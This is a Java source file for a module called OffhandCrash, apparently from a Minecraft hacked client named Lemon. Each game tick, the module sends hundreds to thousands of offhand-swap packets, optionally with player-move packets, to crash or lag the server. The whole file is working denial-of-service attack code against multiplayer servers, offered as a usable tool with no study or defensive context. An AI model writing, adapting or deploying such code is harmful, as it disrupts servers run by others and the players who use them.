package me.pm.lemon.module.modules.exploits;

import me.pm.lemon.event.EventTarget;
import me.pm.lemon.event.events.ReadPacketEvent;
import me.pm.lemon.event.events.TickEvent;
import me.pm.lemon.gui.testScreen.settings.*;
import me.pm.lemon.module.Category;
import me.pm.lemon.module.Module;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.s2c.play.DisconnectS2CPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

import java.awt.*;

public class OffhandCrash extends Module {
    public OffhandCrash(String name, Category category, String description, int keyCode, Color color) {
        super(name, category, description, keyCode, color,
                new SettingSlider("Switches", 0, 2000, 420, 0),
                new SettingToggle("Player Packet", true),
                new SettingToggle("Auto-Off", true));
    }

    @EventTarget
    public void onTick(TickEvent event) {
        for (int i = 0; i < getSetting(0).asSlider().getValue(); i++) {
            mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.UP));
            if (getSetting(1).asToggle().state) mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket(true));
        }
    }

    @EventTarget
    private void EventDisconnect(ReadPacketEvent event) {
        if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(2).asToggle().state) setToggled(false);
    }
}